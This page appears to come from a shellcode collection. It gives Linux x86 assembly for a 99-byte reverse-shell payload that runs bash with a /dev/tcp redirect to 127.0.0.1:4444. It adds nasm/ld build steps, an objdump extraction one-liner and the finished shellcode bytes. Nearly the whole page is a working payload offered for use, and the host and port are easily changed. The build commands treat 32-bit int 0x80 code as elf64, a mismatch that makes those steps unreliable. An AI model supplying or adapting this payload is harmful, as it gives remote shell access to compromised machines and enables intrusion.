---
layout: default
title: Execve bash Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-22.html
os: Linux
arch: Intel x86
length: 99
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ebx, ebx				; EBX = 0
	xor ecx, ecx				; ECX = 0
	mul ebx					; EAX, EDX = 0

	push eax				; Push null terminator
	push 0x68732f2f				; Push "//sh"
	push 0x6e69622f				; Push "/bin"
	mov ebx, esp				; EBX -> "/bin//sh"

	push eax				; Push null terminator
	push word 0x632d			; Push "-c"
	mov edi, esp

	push eax				; Push null terminator
	push 0x31263e30				; Push "0>&1"
	push 0x2031263e				; Push ">&1 "
	push 0x32203434				; Push "44 2"
	push 0x34342f31				; Push "1/44"
	push 0x2e302e30				; Push "0.0."
	push 0x2e373231				; Push "127."
	push 0x2f706374				; Push "tcp/"
	push 0x2f766564				; Push "dev/"
	push 0x2f3e2069				; Push "i >/"
	push 0x2d206873				; Push "sh -"
	push 0x61622f2f				; Push "//ba"
	push 0x6e69622f				; Push "/bin"
	mov ecx, esp

	push eax                                ; Push null terminator
	push ecx                                ; Push pointer to "/bin//bash -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1"
	push edi                                ; Push pointer to "-c"
	push ebx                                ; Push pointer to "/bin//sh"
	mov ecx, esp                            ; Move argv into ECX

	mov al, 0xb				; EAX = 0xb (execve syscall number)
	int 0x80                                ; Execute execve syscall
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\x31\xc9\xf7\xe3\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x63\x89\xe7\x50\x68\x30\x3e\x26\x31\x68\x3e\x26\x31\x20\x68\x34\x34\x20\x32\x68\x31\x2f\x34\x34\x68\x30\x2e\x30\x2e\x68\x31\x32\x37\x2e\x68\x74\x63\x70\x2f\x68\x64\x65\x76\x2f\x68\x69\x20\x3e\x2f\x68\x73\x68\x20\x2d\x68\x2f\x2f\x62\x61\x68\x2f\x62\x69\x6e\x89\xe1\x50\x51\x57\x53\x89\xe1\xb0\x0b\xcd\x80
```